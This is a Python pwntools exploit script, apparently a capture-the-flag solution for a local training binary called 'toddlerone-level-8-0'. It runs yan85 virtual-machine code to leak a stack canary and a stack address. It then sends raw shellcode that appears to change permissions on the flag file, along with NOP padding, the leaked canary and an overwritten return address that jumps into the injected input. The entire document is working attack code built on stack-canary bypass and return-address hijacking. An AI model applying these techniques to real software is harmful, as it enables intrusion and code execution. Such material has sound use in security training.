from pwn import *
from yan85_asm import assemble

offset_to_canary = 0xb8
offset_to_return = 0xc8
offset_from_leak_to_input = 0x1b8

p = process("./toddlerone-level-8-0")

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05"

yancode = """
IMM a, 1
IMM b, 0xFF
IMM c, 0x11
SYS 0x2, a

IMM a, 1
IMM b, 0x50
IMM c, 0xFF
SYS 0x2, a

IMM a, 0
IMM b, 0x50
IMM c, 0xFF
SYS 0x20, a
"""

code = assemble(yancode, order_str='arg1,op,arg2')

print(p.clean())

payload = b""
payload += code

p.send(payload)

x = p.clean()
leaked_canary = int.from_bytes(x.split(b"write\n")[1].split(b"[s]")[0].split(b"\x00")[-1], 'little')
leaked_stack = int.from_bytes([y for y in x.split(b"write\n")[2].split(b"[s]")[0].split(b"\x00") if y != b""][-5], 'little')

leaked_canary = leaked_canary << 8

print("[+] Leaked Canary :: ", hex(leaked_canary))
print("[+] Leaked Stack :: ", hex(leaked_stack))

payload = b""
payload += shellcode
payload += b"\x90" * (offset_to_canary - len(payload))
payload += p64(leaked_canary)
payload += b"\x90" * (offset_to_return - len(payload))
payload += p64(leaked_stack - offset_from_leak_to_input)

p.send(payload)

print(p.clean())

p.close()
